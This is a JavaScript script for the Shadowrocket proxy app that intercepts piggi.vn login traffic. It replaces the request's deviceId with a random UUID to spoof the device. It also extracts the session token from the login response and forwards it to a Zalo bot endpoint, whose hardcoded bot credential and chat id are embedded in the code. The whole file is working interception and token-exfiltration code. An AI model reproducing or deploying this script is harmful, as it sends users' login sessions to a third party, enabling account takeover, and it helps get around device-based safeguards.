/**
 * @fileoverview Shadowrocket script for piggi.vn login
 * - Override deviceId in request body to random UUID
 * - Capture token from response and forward to Zalo bot
 */

function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
        var r = Math.random() * 16 | 0;
        var v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16).toLowerCase();
    });
}

const isRequest = typeof $request !== "undefined";
const isResponse = typeof $response !== "undefined";

if (isRequest && !isResponse) {
    // --- HANDLE REQUEST ---
    let body = $request.body;
    if (body) {
        try {
            let obj = JSON.parse(body);
            if (obj.deviceId !== undefined) {
                obj.deviceId = generateUUID();
                body = JSON.stringify(obj);
            }
        } catch (e) {
            console.log("Error parsing request body: " + e.message);
        }
    }
    $done({ body: body });
} else if (isResponse) {
    // --- HANDLE RESPONSE ---
    let body = $response.body;
    if (body) {
        try {
            let obj = JSON.parse(body);
            if (obj && obj.data && obj.data.token) {
                let token = obj.data.token;

                let zaloUrl = "https://bot-api.zaloplatforms.com/bot3638914406530093654:sFwfWYIvrOYeZJfoHfpBwwgsxOHcSzisHLeIEJprYVzfwRPiFWTBQEvDyJbEYvRK/sendMessage";
                let zaloBody = {
                    chat_id: "b89af526f06919374078",
                    text: token
                };

                let options = {
                    url: zaloUrl,
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(zaloBody)
                };

                // Forward to Zalo
                $httpClient.post(options, function (error, response, data) {
                    if (error) {
                        console.log("Zalo send error: " + error);
                    } else {
                        console.log("Zalo send success: " + data);
                    }
                    // Resume original response
                    $done({ body: $response.body });
                });

            } else {
                $done({ body: $response.body });
            }
        } catch (e) {
            console.log("Error parsing response body: " + e.message);
            $done({ body: $response.body });
        }
    } else {
        $done({ body: $response.body });
    }
} else {
    $done({});
}
